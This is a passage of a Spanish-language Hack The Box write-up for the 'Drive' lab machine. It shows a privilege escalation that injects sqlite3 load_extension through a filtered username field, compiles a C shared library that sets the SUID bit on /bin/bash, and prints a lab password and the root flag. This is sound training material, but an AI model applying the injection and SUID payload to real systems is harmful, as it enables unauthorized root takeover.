![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/dd7a6ee5-bab1-4c8c-a4ad-c658bfb8290d)

- Vemos que la función `show_users_list` invoca al binario de `sqlite3` y a través de una query selecciona los datos del usuario para mostrarlos en pantalla.
- Esto en realidad no es otra cosa que una ejecución de comando, no tiene mucha criticidad más allá de que usa system, pero no tenemos forma de cargar otra cosa dentro de la instrucción de memoria.
- Las demás funciones son más de lo mismo, a excepción de la última, `activate_user`:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/3bd738d1-d466-4500-838f-f3942b316e78)

- Algo que podríamos hacer es modificar la query que manda, pero hay un problema:

	- Tenemos esta query:
	
	~~~bash
/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"%s\";\'
	~~~

	- Si añadimos ciertos caracteres, es posible modificarla para añadir una segunda sentencia:
 - ``'UPDATE accounts_customuser SE T is_active=1 WHERE username=""';whoami";'``

- El problema es que no podemos hacer esto, ya que al parecer el programa sanitiza la entrada y prohíbe ciertos caracteres.
- Buscando en la función que se encarga de sanitizar, dichos caracteres son: `"{/| ' \n \0".`
- Para este punto ya me había rendido, hasta que encontré un concepto para ejecutar comandos a través de ``sqlite3`` llamado [load extension](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/)
- Este se basa en crear un archivo de extensión en C y cargarlo como argumento para que lo ejecute.
- En sí, el programa buscará una librería especifica de sqlite3, y si no la encuentra, construirá otra tomando el nombre de mi archivo hasta el último punto, quitando la palabra lib si este la poseé.
- Ejemplo: Si tengo un archivo ``libtest.so``, sqlite3 cargará un archivo llamado ``sqlite_test_init``.

- Podemos construir un payload de la siguiente manera, cerrando una de las querys con comillas dobles para concatenarle nuestra llamada a función, y cerrar con otra comilla doble la que queda suelta:

~~~bash
'UPDATE accounts_customuser SE T is_active=1 WHERE username=""+load_extension()+"";'
~~~

- Y si lo hacemos de esta manera, vemos que nos interpreta la función `load_extension()`:

~~~bash
doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: 5
Enter username to activate account: "+load_extension()+"
Activating account for user '"+load_extension()+"'...
Error: wrong number of arguments to function load_extension()
~~~

- Nos crearemos un script llamado `exploit.c`, con una función que se llamará como la buscará `load_extension()` cuando la llamemos a ejecución:

~~~C
#include <stdio.h>
#include <stdlib.h>
void sqlite_a_init() {
    setuid(0);
    setgid(0);
    system("chmod u+s /bin/bash");
}
~~~

- Y lo compilamos de la siguiente manera:

~~~bash
tom@drive:~$ gcc -shared -fPIC -o a.so exploit.c
tom@drive:~$ ls
doodleGrive-cli  exploit.c  a.so  README.txt  user.txt
~~~

- Una vez hecho esto, lo que tendríamos que hacer sería cargar nuestro payload, ya que tenemos que escribir `./a` y la diagonal es un bad-char, podemos utilizar char y añadir los valores en ASCII:

~~~bash
"+load_extension(char(46,47,97))+"
~~~

- Y si todo sale bien, deberíamos obtener una shell como root:

~~~bash
tom@drive:~$ ./doodleGrive-cli 
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
moriarty
Enter password for moriarty:
findMeIfY0uC@nMr.Holmz!
Welcome...!

doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: 5
Enter username to activate account: "+load_extension(char(46,47,97))+"
Activating account for user '"+load_extension(char(46,47,97))+"'...
bash: groups: No such file or directory
bash: lesspipe: No such file or directory
bash: dircolors: No such file or directory
root@drive:~# whoami
bash: whoami: No such file or directory
root@drive:~# bash
bash: bash: No such file or directory
root@drive:~# /bin/bash
bash: groups: No such file or directory
bash: lesspipe: No such file or directory
bash: dircolors: No such file or directory
~~~

- Por alguna razón esta máquina no tiene Path como root xd.

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/c98d7ef1-109a-4af7-92c5-86a0911af99d)

- Así que podemos exportar este:

~~~bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
~~~

- Y ahora si, somos root:

~~~bash
root@drive:~# cd /root
root@drive:/root# ls
root.txt
root@drive:/root# cat root.txt 
986d01dadc8bd8704a872bd50bb13018
~~~

- Esta máquina sin duda pone a prueba bastantes conceptos, si bien la explotación web es bastante básica, la verdadera dificultad radica en el análisis del binario. Para ser mi primera máquina Hard en HacktheBox, le doy un 6/10 de dificultad.
